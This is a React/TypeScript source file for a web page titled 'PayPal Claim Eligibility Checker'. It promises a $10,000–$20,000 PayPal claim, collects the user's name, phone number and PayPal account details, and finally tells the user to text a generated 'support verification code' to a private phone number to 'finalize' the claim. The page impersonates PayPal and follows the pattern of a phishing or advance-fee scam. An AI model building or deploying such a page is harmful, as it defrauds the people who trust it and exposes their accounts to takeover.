import { useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { AlertCircle, CheckCircle2, XCircle, User, ArrowRight, ArrowLeft, KeyRound, Copy } from "lucide-react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "PayPal Claim Eligibility Checker" },
      { name: "description", content: "Check if you may be eligible for a $10,000–$20,000 PayPal claim." },
      { property: "og:title", content: "PayPal Claim Eligibility Checker" },
      { property: "og:description", content: "Check if you may be eligible for a $10,000–$20,000 PayPal claim." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: PayPalEligibilityForm,
});

const claimSchema = z.object({
  hasPayPalAccount: z.enum(["yes", "no"]),
  usResident: z.enum(["yes", "no"]),
  lossAmount: z.enum(["under", "within", "over"]),
  timelyDispute: z.enum(["yes", "no", "unsure"]),
  unresolved: z.enum(["yes", "no", "partial"]),
  documentation: z.enum(["yes", "some", "no"]),
});

type ClaimForm = z.infer<typeof claimSchema>;

const initialForm: ClaimForm = {
  hasPayPalAccount: "yes",
  usResident: "yes",
  lossAmount: "within",
  timelyDispute: "yes",
  unresolved: "yes",
  documentation: "yes",
};

const phoneRegex = /^[+]?[\d\s\-().]{7,20}$/;

const detailsSchema = z.object({
  fullName: z
    .string()
    .trim()
    .min(2, "Full name must be at least 2 characters")
    .max(100, "Full name must be less than 100 characters"),
  email: z
    .string()
    .trim()
    .min(1, "Email is required")
    .email("Please enter a valid email address")
    .max(255, "Email must be less than 255 characters"),
  phone: z
    .string()
    .trim()
    .min(1, "Phone number is required")
    .regex(phoneRegex, "Please enter a valid phone number")
    .max(20, "Phone number is too long"),
  claimReference: z
    .string()
    .trim()
    .min(3, "Claim reference must be at least 3 characters")
    .max(50, "Claim reference must be less than 50 characters"),
  paypalEmail: z
    .string()
    .trim()
    .min(1, "PayPal email is required")
    .email("Please enter a valid PayPal email address")
    .max(255, "PayPal email must be less than 255 characters"),
  paypalAccountName: z
    .string()
    .trim()
    .min(2, "PayPal account name must be at least 2 characters")
    .max(100, "PayPal account name must be less than 100 characters"),
  paypalUsername: z
    .string()
    .trim()
    .min(2, "PayPal username must be at least 2 characters")
    .max(50, "PayPal username must be less than 50 characters"),
});

type ClaimantDetails = z.infer<typeof detailsSchema>;

const initialDetails: ClaimantDetails = {
  fullName: "",
  email: "",
  phone: "",
  claimReference: "",
  paypalEmail: "",
  paypalAccountName: "",
  paypalUsername: "",
};

const CODE_ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

function generateSupportCode() {
  const bytes = new Uint8Array(8);
  crypto.getRandomValues(bytes);
  const body = Array.from(bytes, (b) => CODE_ALPHABET[b % CODE_ALPHABET.length]).join("");
  return `PP-${body.slice(0, 4)}-${body.slice(4)}`;
}

function PayPalEligibilityForm() {
  const [form, setForm] = useState<ClaimForm>(initialForm);
  const [result, setResult] = useState<"eligible" | "not-eligible" | "maybe" | null>(null);
  const [errors, setErrors] = useState<string[]>([]);

  const [step, setStep] = useState<"eligibility" | "details" | "submitted">("eligibility");
  const [details, setDetails] = useState<ClaimantDetails>(initialDetails);
  const [detailErrors, setDetailErrors] = useState<Partial<Record<keyof ClaimantDetails, string>>>({});
  const [supportCode, setSupportCode] = useState<string>("");
  const [copied, setCopied] = useState(false);

  const handleChange = (field: keyof ClaimForm, value: string) => {
    setForm((prev) => ({ ...prev, [field]: value }));
    setResult(null);
    setErrors([]);
  };

  const checkEligibility = () => {
    const parse = claimSchema.safeParse(form);
    if (!parse.success) {
      setErrors(parse.error.errors.map((e) => e.message));
      setResult(null);
      return;
    }

    const data = parse.data;

    if (data.hasPayPalAccount === "no" || data.usResident === "no" || data.lossAmount !== "within") {
      setResult("not-eligible");
      return;
    }

    if (data.timelyDispute === "no" || data.unresolved === "no") {
      setResult("not-eligible");
      return;
    }

    if (
      data.timelyDispute === "yes" &&
      (data.unresolved === "yes" || data.unresolved === "partial") &&
      (data.documentation === "yes" || data.documentation === "some")
    ) {
      setResult("eligible");
      return;
    }

    setResult("maybe");
  };

  const canProceed = result === "eligible" || result === "maybe";

  const handleDetailsChange = (field: keyof ClaimantDetails, value: string) => {
    setDetails((prev) => ({ ...prev, [field]: value }));
    setDetailErrors((prev) => ({ ...prev, [field]: "" }));
  };

  const submitDetails = () => {
    const parse = detailsSchema.safeParse(details);
    if (!parse.success) {
      const fieldErrors: Record<string, string> = {};
      for (const issue of parse.error.errors) {
        const key = String(issue.path[0] ?? "_");
        if (!fieldErrors[key]) fieldErrors[key] = issue.message;
      }
      setDetailErrors(fieldErrors);
      return;
    }
    setDetailErrors({});
    setSupportCode(generateSupportCode());
    setCopied(false);
    setStep("submitted");
  };

  return (
    <main className="min-h-screen bg-background py-12 px-4 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-2xl space-y-8">
        <div className="text-center">
          <h1 className="text-3xl font-bold tracking-tight text-foreground sm:text-4xl">
            PayPal Claim Eligibility
          </h1>
          <p className="mt-3 text-lg text-muted-foreground">
            Answer a few questions to see if you may be eligible for a claim in the{" "}
            <span className="font-semibold text-foreground">$10,000–$20,000</span> range.
          </p>
        </div>

        {/* Step indicator */}
        <ol className="flex items-center justify-center gap-2 text-sm">
          <StepDot label="1. Eligibility" active={step === "eligibility"} done={step !== "eligibility"} />
          <span className="h-px w-8 bg-border" />
          <StepDot label="2. Your details" active={step === "details"} done={step === "submitted"} />
          <span className="h-px w-8 bg-border" />
          <StepDot label="3. Submitted" active={step === "submitted"} done={false} />
        </ol>

        {step !== "details" && (
          <div className="rounded-2xl border border-border bg-card p-6 shadow-sm sm:p-8">
            <div className="space-y-6">
              <RadioGroup
                label="Do you (or did you) have a PayPal account?"
                value={form.hasPayPalAccount}
                onChange={(v) => handleChange("hasPayPalAccount", v)}
                options={[
                  { value: "yes", label: "Yes" },
                  { value: "no", label: "No" },
                ]}
              />

              <RadioGroup
                label="Are you a U.S. resident?"
                value={form.usResident}
                onChange={(v) => handleChange("usResident", v)}
                options={[
                  { value: "yes", label: "Yes" },
                  { value: "no", label: "No" },
                ]}
              />

              <RadioGroup
                label="What is the amount of your loss or dispute?"
                value={form.lossAmount}
                onChange={(v) => handleChange("lossAmount", v)}
                options={[
                  { value: "under", label: "Less than $10,000" },
                  { value: "within", label: "$10,000 – $20,000" },
                  { value: "over", label: "More than $20,000" },
                ]}
              />

              <RadioGroup
                label="Did you file a PayPal dispute or claim within the required time frame?"
                value={form.timelyDispute}
                onChange={(v) => handleChange("timelyDispute", v)}
                options={[
                  { value: "yes", label: "Yes" },
                  { value: "no", label: "No" },
                  { value: "unsure", label: "I'm not sure" },
                ]}
              />

              <RadioGroup
                label="Was your dispute denied, unresolved, or only partially resolved by PayPal?"
                value={form.unresolved}
                onChange={(v) => handleChange("unresolved", v)}
                options={[
                  { value: "yes", label: "Yes — fully denied or unresolved" },
                  { value: "partial", label: "Partially resolved" },
                  { value: "no", label: "No — fully resolved in my favor" },
                ]}
              />

              <RadioGroup
                label="Do you have supporting documentation (receipts, emails, correspondence, etc.)?"
                value={form.documentation}
                onChange={(v) => handleChange("documentation", v)}
                options={[
                  { value: "yes", label: "Yes, full documentation" },
                  { value: "some", label: "Some documentation" },
                  { value: "no", label: "No documentation" },
                ]}
              />
            </div>

            {errors.length > 0 && (
              <div className="mt-6 rounded-lg border border-error/20 bg-error/10 p-4 text-sm text-error">
                <ul className="list-disc space-y-1 pl-5">
                  {errors.map((e, i) => (
                    <li key={i}>{e}</li>
                  ))}
                </ul>
              </div>
            )}

            <div className="mt-8">
              <button
                type="button"
                onClick={checkEligibility}
                className="inline-flex w-full items-center justify-center rounded-lg bg-primary px-6 py-3 text-base font-medium text-primary-foreground transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2"
              >
                Check Eligibility
              </button>
            </div>
          </div>
        )}

        {step !== "details" && result === "eligible" && (
          <div className="rounded-2xl border border-success/20 bg-success/10 p-6 sm:p-8">
            <div className="flex items-start gap-4">
              <CheckCircle2 className="mt-1 h-6 w-6 shrink-0 text-success" />
              <div className="flex-1">
                <h2 className="text-xl font-semibold text-success-foreground">You may be eligible</h2>
                <p className="mt-2 text-success-foreground/80">
                  Based on your answers, your claim appears to fall within the{" "}
                  <span className="font-semibold">$10,000–$20,000</span> eligibility range and you
                  meet the key requirements. Provide your details to continue filing your claim.
                </p>
                <button
                  type="button"
                  onClick={() => setStep("details")}
                  className="mt-4 inline-flex items-center gap-2 rounded-lg bg-success px-5 py-2.5 text-sm font-medium text-success-foreground transition-colors hover:bg-success/90"
                >
                  Continue to claim details <ArrowRight className="h-4 w-4" />
                </button>
              </div>
            </div>
          </div>
        )}

        {step !== "details" && result === "not-eligible" && (
          <div className="rounded-2xl border border-error/20 bg-error/10 p-6 sm:p-8">
            <div className="flex items-start gap-4">
              <XCircle className="mt-1 h-6 w-6 shrink-0 text-error" />
              <div>
                <h2 className="text-xl font-semibold text-error-foreground">You do not appear eligible</h2>
                <p className="mt-2 text-error-foreground/80">
                  One or more of your answers does not match the requirements for this claim
                  category. This is not legal advice; if you believe your situation is unusual, you
                  may still want to consult an attorney.
                </p>
              </div>
            </div>
          </div>
        )}

        {step !== "details" && result === "maybe" && (
          <div className="rounded-2xl border border-warning/20 bg-warning/10 p-6 sm:p-8">
            <div className="flex items-start gap-4">
              <AlertCircle className="mt-1 h-6 w-6 shrink-0 text-warning" />
              <div className="flex-1">
                <h2 className="text-xl font-semibold text-warning-foreground">Eligibility is uncertain</h2>
                <p className="mt-2 text-warning-foreground/80">
                  You meet some requirements, but we need more information (such as exact timing or
                  full documentation) to confirm eligibility. You can still provide your details and
                  a claims specialist will review your case.
                </p>
                <button
                  type="button"
                  onClick={() => setStep("details")}
                  className="mt-4 inline-flex items-center gap-2 rounded-lg bg-warning px-5 py-2.5 text-sm font-medium text-warning-foreground transition-colors hover:bg-warning/90"
                >
                  Continue to claim details <ArrowRight className="h-4 w-4" />
                </button>
              </div>
            </div>
          </div>
        )}

        {step === "details" && (
          <div className="rounded-2xl border border-border bg-card p-6 shadow-sm sm:p-8">
            <div className="mb-6 flex items-center gap-2">
              <User className="h-5 w-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Claimant details</h2>
            </div>

            <div className="space-y-5">
              <TextField
                label="Full name"
                value={details.fullName}
                onChange={(v) => handleDetailsChange("fullName", v)}
                error={detailErrors.fullName}
                placeholder="Jane Doe"
                autoComplete="name"
              />

              <div className="grid gap-5 sm:grid-cols-2">
                <TextField
                  label="Email address"
                  type="email"
                  value={details.email}
                  onChange={(v) => handleDetailsChange("email", v)}
                  error={detailErrors.email}
                  placeholder="jane@example.com"
                  autoComplete="email"
                />
                <TextField
                  label="Cell phone number"
                  type="tel"
                  value={details.phone}
                  onChange={(v) => handleDetailsChange("phone", v)}
                  error={detailErrors.phone}
                  placeholder="+1 555 123 4567"
                  autoComplete="tel"
                />
              </div>

              <TextField
                label="Claim reference"
                value={details.claimReference}
                onChange={(v) => handleDetailsChange("claimReference", v)}
                error={detailErrors.claimReference}
                placeholder="e.g. PP-2026-001234"
              />

              <div className="border-t border-border pt-5">
                <p className="mb-4 text-sm font-medium text-foreground">PayPal account information</p>

                <TextField
                  label="PayPal email address"
                  type="email"
                  value={details.paypalEmail}
                  onChange={(v) => handleDetailsChange("paypalEmail", v)}
                  error={detailErrors.paypalEmail}
                  placeholder="yourname@email.com"
                  autoComplete="email"
                />

                <div className="mt-5 grid gap-5 sm:grid-cols-2">
                  <TextField
                    label="PayPal account full name"
                    value={details.paypalAccountName}
                    onChange={(v) => handleDetailsChange("paypalAccountName", v)}
                    error={detailErrors.paypalAccountName}
                    placeholder="Name on the PayPal account"
                  />
                  <TextField
                    label="PayPal username"
                    value={details.paypalUsername}
                    onChange={(v) => handleDetailsChange("paypalUsername", v)}
                    error={detailErrors.paypalUsername}
                    placeholder="@yourusername"
                  />
                </div>
              </div>
            </div>

            <div className="mt-8 flex flex-col gap-3 sm:flex-row sm:justify-between">
              <button
                type="button"
                onClick={() => setStep("eligibility")}
                className="inline-flex items-center justify-center gap-2 rounded-lg border border-border bg-card px-5 py-3 text-sm font-medium text-foreground transition-colors hover:bg-accent"
              >
                <ArrowLeft className="h-4 w-4" /> Back
              </button>
              <button
                type="button"
                onClick={submitDetails}
                className="inline-flex items-center justify-center gap-2 rounded-lg bg-primary px-6 py-3 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2"
              >
                Submit claim details
              </button>
            </div>
          </div>
        )}

        {step === "submitted" && (
          <div className="rounded-2xl border border-success/20 bg-success/10 p-6 sm:p-8">
            <div className="flex items-start gap-4">
              <CheckCircle2 className="mt-1 h-6 w-6 shrink-0 text-success" />
              <div className="flex-1">
                <h2 className="text-xl font-semibold text-success-foreground">Details submitted</h2>
                <p className="mt-2 text-success-foreground/80">
                  Thank you, {details.fullName.split(" ")[0]}. Your claim details have been recorded
                  for review. A claims specialist will contact you at{" "}
                  <span className="font-semibold">{details.email}</span>.
                </p>

                <div className="mt-5 rounded-xl border border-primary/30 bg-primary/5 p-5">
                  <div className="flex items-center gap-2">
                    <KeyRound className="h-5 w-5 text-primary" />
                    <h3 className="text-sm font-semibold text-foreground">
                      Support verification code
                    </h3>
                  </div>
                  <p className="mt-2 text-sm text-muted-foreground">
                    Share this code with your support representative so they can finalize your
                    $10,000 claim. Text the code to{" "}
                    <a href="sms:+13072961259" className="font-semibold text-primary underline">
                      +1 307-296-1259
                    </a>{" "}
                    from the cell number you provided to complete filing.
                  </p>
                  <div className="mt-4 flex flex-col gap-3 sm:flex-row sm:items-center">
                    <span className="flex-1 rounded-lg border border-border bg-background px-4 py-3 text-center font-mono text-xl font-bold tracking-[0.2em] text-foreground">
                      {supportCode}
                    </span>
                    <button
                      type="button"
                      onClick={() => {
                        void navigator.clipboard?.writeText(supportCode);
                        setCopied(true);
                      }}
                      className="inline-flex items-center justify-center gap-2 rounded-lg bg-primary px-5 py-3 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
                    >
                      <Copy className="h-4 w-4" /> {copied ? "Copied" : "Copy code"}
                    </button>
                  </div>
                  <p className="mt-3 text-xs text-muted-foreground">
                    Keep this code private. Only give it to a verified PayPal support
                    representative handling claim {details.claimReference}.
                  </p>
                </div>

                <dl className="mt-5 grid gap-3 text-sm sm:grid-cols-2">
                  <Detail label="Support code" value={supportCode} />
                  <Detail label="Full name" value={details.fullName} />
                  <Detail label="Email" value={details.email} />
                  <Detail label="Phone" value={details.phone} />
                  <Detail label="Claim reference" value={details.claimReference} />
                  <Detail label="PayPal email" value={details.paypalEmail} />
                  <Detail label="PayPal account name" value={details.paypalAccountName} />
                  <Detail label="PayPal username" value={details.paypalUsername} />
                </dl>
                <button
                  type="button"
                  onClick={() => {
                    setStep("eligibility");
                    setForm(initialForm);
                    setDetails(initialDetails);
                    setResult(null);
                    setSupportCode("");
                    setCopied(false);
                  }}
                  className="mt-6 inline-flex items-center gap-2 rounded-lg border border-success/30 bg-success/10 px-5 py-2.5 text-sm font-medium text-success-foreground transition-colors hover:bg-success/20"
                >
                  Start a new claim
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}

function StepDot({ label, active, done }: { label: string; active: boolean; done: boolean }) {
  return (
    <span
      className={`inline-flex items-center gap-1.5 rounded-full px-3 py-1 text-xs font-medium ${
        active
          ? "bg-primary text-primary-foreground"
          : done
            ? "bg-primary/10 text-primary"
            : "bg-muted text-muted-foreground"
      }`}
    >
      {label}
    </span>
  );
}

function Detail({ label, value }: { label: string; value: string }) {
  return (
    <div className="rounded-lg border border-border bg-card/50 px-3 py-2">
      <dt className="text-xs uppercase tracking-wide text-muted-foreground">{label}</dt>
      <dd className="mt-0.5 font-medium text-foreground">{value}</dd>
    </div>
  );
}

function TextField({
  label,
  value,
  onChange,
  error,
  placeholder,
  type = "text",
  autoComplete,
}: {
  label: string;
  value: string;
  onChange: (value: string) => void;
  error?: string | undefined;
  placeholder?: string;
  type?: string;
  autoComplete?: string;
}) {
  return (
    <div>
      <label className="mb-1.5 block text-sm font-medium text-foreground">{label}</label>
      <input
        type={type}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        autoComplete={autoComplete}
        className={`block w-full rounded-lg border bg-background px-4 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:ring-2 focus:ring-ring ${
          error ? "border-error focus:ring-error" : "border-border focus:ring-primary"
        }`}
      />
      {error && <p className="mt-1 text-xs text-error">{error}</p>}
    </div>
  );
}

function RadioGroup({
  label,
  value,
  onChange,
  options,
}: {
  label: string;
  value: string;
  onChange: (value: string) => void;
  options: { value: string; label: string }[];
}) {
  return (
    <fieldset className="space-y-3">
      <legend className="text-sm font-medium text-foreground">{label}</legend>
      <div className="grid gap-2 sm:grid-cols-2">
        {options.map((option) => {
          const id = `${label}-${option.value}`;
          return (
            <label
              key={option.value}
              htmlFor={id}
              className={`flex cursor-pointer items-center gap-3 rounded-lg border px-4 py-3 transition-colors ${
                value === option.value
                  ? "border-primary bg-primary/5"
                  : "border-border bg-card hover:bg-accent"
              }`}
            >
              <input
                id={id}
                type="radio"
                name={label}
                value={option.value}
                checked={value === option.value}
                onChange={() => onChange(option.value)}
                className="h-4 w-4 text-primary focus:ring-ring"
              />
              <span className="text-sm text-foreground">{option.label}</span>
            </label>
          );
        })}
      </div>
    </fieldset>
  );
}
